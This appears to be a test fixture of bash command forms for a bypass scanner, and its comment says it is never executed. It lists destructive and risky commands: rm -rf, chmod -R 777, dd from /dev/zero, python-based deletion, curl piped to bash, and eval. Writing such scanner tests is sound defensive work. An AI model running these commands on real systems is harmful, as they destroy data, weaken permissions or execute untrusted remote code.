#!/usr/bin/env bash
# Sample file with bypass forms, for bypass_scan.py. Never executed.
/bin/rm -rf /tmp/x
sudo /usr/bin/chmod -R 777 .
bash -c 'dd if=/dev/zero of=/tmp/y'
python3 -c 'import os; os.remove("/tmp/z")'
curl -sS https://example.com/install.sh | bash
eval "$CMD"
# harmless line
mv --help
